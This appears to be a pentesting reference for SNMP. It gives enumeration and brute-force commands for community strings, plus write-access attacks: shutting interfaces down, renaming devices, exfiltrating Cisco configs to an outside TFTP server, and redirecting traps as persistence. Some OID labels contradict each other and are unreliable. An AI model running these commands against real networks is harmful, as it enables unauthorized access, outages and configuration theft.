# SNMP

**`Default Port: 161/UDP, 162/UDP (Traps)`**

**Simple Network Management Protocol (SNMP)** is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. Devices that typically support SNMP include routers, switches, servers, workstations, printers, modem racks, and more. It is widely used for network monitoring and management. SNMP exposes management data in the form of variables on the managed systems, which describe the system status and configuration. These variables can then be queried (and sometimes set) by managing applications.

### Connect <a href="#connect" id="connect"></a>

Interaction with SNMP-enabled devices is typically done using command-line tools that can send SNMP requests to an agent.

#### Using `snmpwalk` <a href="#using-snmpwalk" id="using-snmpwalk"></a>

`snmpwalk` is a command-line application that uses SNMP GETNEXT requests to query a network entity for a tree of information.

```
# For SNMPv1/v2c (most common for pentesting due to weaker security)
snmpwalk -c <community_string> -v1 <target_ip>
snmpwalk -c <community_string> -v2c <target_ip>

# Example: Walking the entire MIB tree
snmpwalk -c public -v2c 192.168.1.1

# Example: Walking a specific OID
snmpwalk -c public -v2c 192.168.1.1 .1.3.6.1.2.1.1.1.0 # sysDescr
```

#### Using `snmp-check` <a href="#using-snmp-check" id="using-snmp-check"></a>

`snmp-check` is another useful tool for enumerating SNMP information in a human-readable format.

```
snmp-check -t <target_ip> -c <community_string>
# If community string is unknown, it might try default ones like 'public'
snmp-check -t 192.168.1.1
```

#### Using `snmpget` <a href="#using-snmpget" id="using-snmpget"></a>

`snmpget` is used to retrieve a specific MIB (Management Information Base) object value from an SNMP agent.

```
snmpget -v2c -c <community_string> <target_ip> <OID>
# Example
snmpget -v2c -c public 192.168.1.1 sysDescr.0
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect SNMP services and identify server capabilities.

```
nmap -sU -p 161 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to SNMP services to gather version and system information.

**Using snmpget**

```
# Using snmpget to retrieve system description (sysDescr)
snmpget -v1 -c public target.com .1.3.6.1.2.1.1.1.0
snmpget -v2c -c public target.com sysDescr.0
```

**Using nmap**

```
# Nmap scripts can provide detailed SNMP information
nmap -sU -p 161 --script snmp-info target.com
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

Use various tools for detailed SNMP enumeration and information gathering.

#### Community String Discovery <a href="#community-string-discovery" id="community-string-discovery"></a>

Discover valid SNMP community strings for authentication.

**Using onesixtyone**

```
# Using onesixtyone
onesixtyone -c /path/to/community_string_list.txt target.com
```

**Using Nmap**

```
# Using Nmap script
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=community_strings.txt target.com
```

**Using Metasploit**

```
msfconsole
msf > use auxiliary/scanner/snmp/snmp_login
msf auxiliary(scanner/snmp/snmp_login) > set RHOSTS target.com
msf auxiliary(scanner/snmp/snmp_login) > set PASS_FILE /path/to/community_wordlist.txt
msf auxiliary(scanner/snmp/snmp_login) > run
```

#### System Information Enumeration <a href="#system-information-enumeration" id="system-information-enumeration"></a>

Enumerate system information using discovered community strings.

**Using snmp-check**

```
# Using snmp-check for a comprehensive enumeration
snmp-check -t target.com -c <community_string>
```

**Using snmpwalk**

```
# Walking common MIBs
snmpwalk -c <community_string> -v2c target.com system # System information
snmpwalk -c <community_string> -v2c target.com interfaces # Network interfaces
snmpwalk -c <community_string> -v2c target.com ipAddrTable # IP addresses
snmpwalk -c <community_string> -v2c target.com hrSystemUptime # Host Uptime
snmpwalk -c <community_string> -v2c target.com hrStorageTable # Storage Info
snmpwalk -c <community_string> -v2c target.com hrSWRunTable # Running Software
```

**Using Nmap Scripts**

```
# Enumerate system information
nmap -sU -p 161 --script snmp-sysdescr target.com -sV

# Enumerate network interfaces
nmap -sU -p 161 --script snmp-interfaces target.com -sV

# Enumerate listening TCP/UDP ports
nmap -sU -p 161 --script snmp-netstat target.com -sV

# Enumerate running processes
nmap -sU -p 161 --script snmp-processes target.com -sV
```

#### Windows-Specific Enumeration <a href="#windows-specific-enumeration" id="windows-specific-enumeration"></a>

Enumerate Windows-specific information via SNMP.

```
msfconsole
msf > use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) > set RHOSTS target.com
msf auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY <community_string> # Defaults to public
msf auxiliary(scanner/snmp/snmp_enum) > run

msf > use auxiliary/scanner/snmp/snmp_enumusers # If enumerating users on Windows via SNMP
msf auxiliary(scanner/snmp/snmp_enumusers) > set RHOSTS target.com
msf auxiliary(scanner/snmp/snmp_enumusers) > run

msf > use auxiliary/scanner/snmp/snmp_enumshares # If enumerating shares on Windows via SNMP
msf auxiliary(scanner/snmp/snmp_enumshares) > set RHOSTS target.com
msf auxiliary(scanner/snmp/snmp_enumshares) > run
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

Exploit various SNMP vulnerabilities and misconfigurations for unauthorized access.

#### Default and Weak Community Strings <a href="#default-and-weak-community-strings" id="default-and-weak-community-strings"></a>

SNMP installations often retain default or weak community strings for system access.

```
# Test default community strings
snmpwalk -c public -v1 target.com
snmpwalk -c private -v1 target.com
snmpwalk -c public -v2c target.com
snmpwalk -c private -v2c target.com

# Other common strings
snmpwalk -c admin -v2c target.com
snmpwalk -c manager -v2c target.com
snmpwalk -c community -v2c target.com
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

Brute force SNMP community strings using various tools and techniques.

**Using onesixtyone**

```
# Using onesixtyone
onesixtyone -c /path/to/community_string_list.txt target.com
```

**Using Nmap**

```
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=wordlist.txt target.com
```

**Using Metasploit**

```
msfconsole
msf > use auxiliary/scanner/snmp/snmp_login
msf auxiliary(scanner/snmp/snmp_login) > set RHOSTS target.com
msf auxiliary(scanner/snmp/snmp_login) > set PASS_FILE /path/to/community_wordlist.txt
msf auxiliary(scanner/snmp/snmp_login) > run
```

#### SNMPv3 Credential Cracking <a href="#snmpv3-credential-cracking" id="snmpv3-credential-cracking"></a>

Exploit SNMPv3 vulnerabilities for unauthorized access.

```
# SNMPv3 is more secure but can be vulnerable if weak credentials are used
# Tools like snmp-brute.py (part of the snmpwn toolset) or custom scripts
# might be used if SNMPv3 user enumeration is possible

# Capturing SNMPv3 traffic can also allow offline password cracking
# attempts against the hashed credentials
```

#### Write Access Exploitation <a href="#write-access-exploitation" id="write-access-exploitation"></a>

Exploit read-write community strings to modify device configurations.

```
# Example: Changing the system name (sysName OID: .1.3.6.1.2.1.1.5.0)
# Syntax: snmpset -v[1|2c] -c <rw_community_string> <target_ip> <OID> <type> <value>
snmpset -v2c -c private target.com .1.3.6.1.2.1.1.5.0 s "NewSystemName"

# Potentially more harmful:
# - Modifying routing tables
# - Shutting down interfaces
# - Uploading/downloading device configurations (e.g., on Cisco devices via TFTP related OIDs)
# - Clearing logs
```

#### Information Disclosure <a href="#information-disclosure" id="information-disclosure"></a>

Extract sensitive information from SNMP-enabled devices.

Even with read-only access, SNMP can reveal a vast amount of sensitive information:

```
# Network topology (routing tables, ARP caches)
snmpwalk -c public -v2c target.com .1.3.6.1.2.1.4.22.1.3

# Device configurations
snmpwalk -c public -v2c target.com .1.3.6.1.2.1.1.1.0

# Usernames (especially on Windows systems)
snmpwalk -c public -v2c target.com .1.3.6.1.4.1.77.1.2.25

# Running services and processes
snmpwalk -c public -v2c target.com .1.3.6.1.2.1.25.4.2.1.2

# Software versions
snmpwalk -c public -v2c target.com .1.3.6.1.2.1.25.6.3.1.2
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

Extract sensitive data and manipulate network devices after successful SNMP exploitation.

#### Information Gathering <a href="#information-gathering" id="information-gathering"></a>

Extract comprehensive information from SNMP-enabled devices using specific OIDs.

```
# System description
snmpget -v2c -c public target.com .1.3.6.1.2.1.1.1.0

# System name
snmpget -v2c -c public target.com .1.3.6.1.2.1.1.5.0

# Interface descriptions
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.2.2.1.2

# IP addresses on interfaces
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.4.20.1.1

# ARP table (IP to MAC)
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.4.22.1.3

# Running programs
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.25.6.3.1.2

# Storage descriptions (Windows)
snmpwalk -v2c -c public target.com .1.3.6.1.4.1.77.1.2.25

# System CPU load (Net-SNMP)
snmpwalk -v2c -c public target.com .1.3.6.1.4.1.2021.11
```

#### Configuration Modification <a href="#configuration-modification" id="configuration-modification"></a>

Modify device configurations using write access community strings.

```
# Example: Setting an interface administratively down
# To set interface with index 1 down (integer value 2 for 'down')
snmpset -v2c -c private target.com .1.3.6.1.2.1.2.2.1.7.1 i 2

# Change system name
snmpset -v2c -c private target.com .1.3.6.1.2.1.1.5.0 s "CompromisedDevice"

# Modify contact information
snmpset -v2c -c private target.com .1.3.6.1.2.1.1.4.0 s "Attacker <attacker@evil.com>"
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract device configurations and sensitive data using SNMP.

```
# On some devices (like older Cisco IOS), SNMP can be used to trigger
# the copying of the running or startup configuration to a TFTP server

# Example OIDs for Cisco configuration exfiltration:
# Set copy protocol to TFTP
snmpset -v2c -c private target.com .1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1

# Set source file type (running config = 4, startup config = 3)
snmpset -v2c -c private target.com .1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 4

# Set destination file type (network file = 1)
snmpset -v2c -c private target.com .1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 i 1

# Set TFTP server IP
snmpset -v2c -c private target.com .1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 a "192.168.1.100"

# Set filename on TFTP server
snmpset -v2c -c private target.com .1.3.6.1.4.1.9.9.96.1.1.1.1.6.1 s "config.txt"

# Start the copy operation
snmpset -v2c -c private target.com .1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 4
```

#### Network Mapping <a href="#network-mapping" id="network-mapping"></a>

Use SNMP information to map network topology and identify additional targets.

```
# Extract routing tables
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.4.21.1.1

# Get ARP cache for network mapping
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.4.22.1.3

# Discover CDP/LLDP neighbors (Cisco devices)
snmpwalk -v2c -c public target.com .1.3.6.1.4.1.9.9.23.1.2.1.1.6

# Get interface status for network topology
snmpwalk -v2c -c public target.com .1.3.6.1.2.1.2.2.1.8
```

#### Persistence <a href="#persistence" id="persistence"></a>

Create persistent backdoor access to SNMP-enabled devices.

```
# Modify SNMP community strings (if write access available)
# This would require device-specific OIDs and may not be possible on all devices

# Create additional SNMP users (SNMPv3)
# This would require device-specific configuration and proper authentication

# Modify SNMP trap destinations to send data to attacker
snmpset -v2c -c private target.com .1.3.6.1.4.1.9.9.43.1.2.1.1.3.1 s "192.168.1.100"
```
